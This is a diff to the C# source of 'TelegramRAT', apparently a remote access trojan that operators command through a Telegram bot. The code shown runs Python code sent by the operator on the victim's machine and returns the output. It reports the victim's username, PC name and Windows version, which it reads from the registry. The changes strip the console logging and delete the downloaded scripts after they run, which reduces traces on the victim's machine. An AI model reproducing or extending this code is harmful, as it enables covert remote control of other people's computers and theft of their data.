@@ -22,6 +22,7 @@ using IronPython.Runtime;
 using Microsoft.Scripting;
 using Microsoft.Scripting.Interpreter;
 using Microsoft.Scripting.Hosting;
+using Microsoft.Win32;
 
 namespace TelegramRAT
 {
@@ -1461,7 +1462,6 @@ namespace TelegramRAT
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
                                     return;
                                 }
-                                Console.WriteLine("Python must execute:" + model.RawArgs);
                                 MemoryStream pyOutput = new MemoryStream();
                                 var pyStream = new MemoryStream();
                                 pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
@@ -1478,7 +1478,6 @@ namespace TelegramRAT
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
                                 }
                                 pyStream.Position = 0;
-                                Console.WriteLine("Output: " + new StreamReader(pyStream).ReadToEnd() + " len:" + pyStream.Length);
                                 pyStream.Close();
                                 return;
                             }
@@ -1495,7 +1494,6 @@ namespace TelegramRAT
 
                                 var file = Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId).Result;
                                 Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
-                                Console.WriteLine("len: " + scriptFileStream.Length);
                                 scriptFileStream.Close();
 
                                 pythonEngine.ExecuteFile("UserScript.py", pythonScope);
@@ -1504,14 +1502,12 @@ namespace TelegramRAT
 
                                 string outputText = new StreamReader(outputStream).ReadToEnd();
 
-                                Console.WriteLine(outputText);
-
                                 if (outputText.Length > 0)
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                 else
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);
 
-                                //System.IO.File.Delete("UserScript.py");
+                                System.IO.File.Delete("UserScript.py");
                                 outputStream.Close();
                             }
 
@@ -1581,7 +1577,7 @@ namespace TelegramRAT
                     $"Username: *{Environment.UserName}*\n" +
                     $"PC name: *{Environment.MachineName}*\n\n" +
 
-                    $"OS: {Environment.OSVersion.ToString()}",
+                    $"OS: {GetWindowsVersion()}",
                     ParseMode.Markdown);
             }
             var offset = 0;
@@ -1683,6 +1679,20 @@ namespace TelegramRAT
                 }
 
             }
+        }
+
+
+        public static string GetWindowsVersion()
+        {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
+            if (key != null)
+            {
+                string prodName = key.GetValue("ProductName") as string;
+                string csdVer = key.GetValue("CSDVersion") as string;
+
+                return prodName + csdVer;
+            }
+            return "";
         }
     }
 }
